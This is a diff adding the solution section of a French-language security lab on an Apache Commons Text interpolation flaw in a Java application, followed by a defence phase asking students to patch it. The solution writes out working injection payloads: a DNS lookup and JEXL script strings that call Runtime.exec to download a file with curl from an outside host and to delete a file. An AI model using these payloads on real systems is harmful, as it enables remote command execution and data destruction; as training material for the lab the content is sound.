@@ -299,3 +299,14 @@ En effectuant quelques recherches, vous apprenez que pour faire cela en Java (vu
     - Vous vérifiez avec Wireshark que ça fonctionne correctement
 - _OPTIONNEL_ : Vous essayez également d'exploiter une faille de type script interpolator pour faire exécuter une commande au serveur
     - Ici on est en Java 17, il va donc falloir utiliser JEXL (cela nécessite donc que cette librairie soit disponible dans l'application, ce qui n'est pas forcément le cas)
+
+### Solution
+
+- Il faut modifier la description avec cela par exemple : ${dns:address|commons.apache.org}
+    - le filtre "dns" de wireshark doit vous renvoyer des résultats sur commons.apache.org
+- Vous pouvez exécuter des commandes script en faisant remplissant la description, par exemple nous allons télécharger un fichier : ${script:JEXL:''.getClass().forName('java.lang.Runtime').getRuntime().exec('curl -k https://ifconfig.io -o C:\ifconfig')}
+    - Puis vous pouvez essayer de supprimer le fichier en question : ${script:JEXL:''.getClass().forName('java.lang.Runtime').getRuntime().exec('cmd /c del C:\ifconfig3')}
+
+## Phase de défense
+
+- Maintenant que vous avez trouvé une faille dans cette application, il est temps de la corriger ! C'est tout de même vous qui maintenez cette application !
